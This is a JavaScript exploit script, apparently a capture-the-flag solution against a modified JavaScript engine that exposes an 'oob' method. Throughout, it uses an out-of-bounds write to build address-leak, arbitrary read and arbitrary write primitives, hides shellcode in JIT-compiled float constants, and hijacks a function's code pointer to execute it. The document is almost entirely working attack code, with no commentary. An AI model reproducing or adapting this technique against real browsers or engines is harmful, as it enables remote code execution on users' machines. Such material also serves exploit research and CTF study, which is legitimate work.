let buf = new ArrayBuffer(8);
let f64 = new Float64Array(buf);
let i64 = new BigUint64Array(buf);

const ftoi = x => {
  f64[0] = x;
  return i64[0];
};

const itof = x => {
  i64[0] = x;
  return f64[0];
};

const hex = x => {
  return `0x${x.toString(16)}`;
};

const pwn = () => {
  return [
    1.8457939563e-314, // 0xdeadbeef
    4.350248014025832e+199,
    -6.032030672671943e-264,
    1.6476837785e-314,
    6.805647357708692e+38,
    2.605888325577797e-284
  ];
};

for (let i = 0; i < 0x10000; i++)
  pwn();

function foo() {
  let arr = new Array(1.1, 2.2, 3.3);

  let oob = new Array(1.1, 2.2, 3.3);
  let rdw = new BigUint64Array(1);             /* rdw.data_slot @ oob[13] */
  let obj = new Array({a: 1}, {b: 2}, {c: 3}); /* obj.elements  @ oob[39] */

  arr.oob(10, itof(0x1337n << 32n));
  arr.oob(11, itof((0x1337n << 32n) + 0x1337n));

  return { oob, rdw, obj };
}

let { oob, rdw, obj } = foo();

const addrof = o => {
  let tmp = oob[13];
  oob[13] = oob[39];

  obj[0] = o;
  let ret = rdw[0] & 0xffffffffffffn;

  oob[13] = tmp;
  return ret;
};

const read = p => {
  let tmp = oob[13];
  oob[13] = itof(p);

  let ret = rdw[0];
  oob[13] = tmp;
  return ret;
};

const write = (p, x) => {
  let tmp = oob[13];
  oob[13] = itof(p);

  rdw[0] = x;
  oob[13] = tmp;
};

let jit = read(addrof(pwn) + 0x28n);
let code = read(jit);

for (var i = 1024n; i < 4096n; i++) {
  if (read(code + i) == 0xdeadbeefn) break;
}

let shellcode = code + i + 8n;

write(jit, shellcode);
pwn();
